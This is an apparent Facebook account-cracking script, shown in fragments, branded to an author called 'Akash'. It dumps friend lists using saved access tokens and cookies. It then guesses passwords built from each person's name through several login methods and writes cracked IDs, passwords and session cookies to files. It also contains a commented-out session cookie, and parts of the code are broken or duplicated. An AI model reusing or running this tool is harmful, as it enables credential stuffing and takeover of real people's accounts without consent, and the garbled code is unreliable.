...
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            A K A SH 
\033[1;37m Facebook:           A K A S H 
\033[1;37m Github  :            Akash
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back Akash Menu ")
        exit()
...
def sarfraz():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://chat.whatsapp.com/J3gpK8NYNQB
        pass
    elif select =='F':
        os.system('xdg-open https://facebook.com/groups/657622865601150/')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        SSB(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Akash] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    ...
    # 'cookie': 'datr=j2f3ZKExxq8Zar84S9uBS9mz; sb=cusSZbREZeSVvj_we-iFdkog; m_pixel_ratio=2; wd=360x668; fr=06754ObM0whM5mZxK.AWXVMzPheKrsUrI0-1SSA35mnd4.Bk92eP.gZ.AAA.0.0.BlEuwX.AWW8jbbBgts',
    'dpr': '2',
...
response = requests.get(
    'https://p.facebook.com/?rtime=1695738755&hrc=1&wtsid=rdr_0vPfILdjghMctgcpe&refsrc=deprecated&_rdr',
    cookies=cookies,
    headers=headers,
)
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [Akash-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Akash_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [Akash-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/Akash_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Akash] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
response = requests.get(
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Akash] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
''accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[Akash] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={sid}&flow=login_no_pin&refsrc=deprecated&_rdr')
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [Akash-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Akash_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    try:
        ...
        for rept in range(srange):
            ...
            if  fbuid=='stop':
                ...
                ys.close()
            try:
                dmp = requests.get("https://p.facebook.com/"+fbuid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/Akash.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/Akash.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    os.system('touch ' +akash)
    os.system('sort -r '+akash+' | uniq > '+sarfraz)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + ssb )
    print(47*'-')
    print("File Saved To :" + akash)
    print(47*'-')
    input(f"{S} Press Enter To Back Akash Menu ")
    menu
...
def menu():
    ...
    try:
        fbcokis = open(".cokis.txt", "r").read()
        token = open('.tokn.txt','r').read()
        info = requests.get('https://p.facebook.com/me/?access_token='+token,cookies = {"cookie":fbcokis}).json()
        nam = info['name']
        uid = info['id']
    ...
    try:
        ...
        for rept in range(srange):
            ...
            if  sid=='stop':
                ...
                ys.close()
            try:
                dmp = requests.get("https://p.facebook.com/"+sid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
                for idnm in dmp['friends']['data']:
                    totaldmp+=1
                    apnd.write(idnm['id']+"|"+idnm['name']+'\n')                      
            except KeyError:
...
def cutter():
    ...
    sarfraz = input('Saving Put File Name:')
    os.system('touch ' +akash)
    os.system('sort -r '+akash+' | uniq > '+akash)
    os.system('clear')
    print(logo)
    print("Removed Successful From File: " + akash )
    print("New File Saved:" + akash )
    print(47*'-')
    input(f"{S} Press Enter To Back Akash Menu ")
    SSB(allkey)       
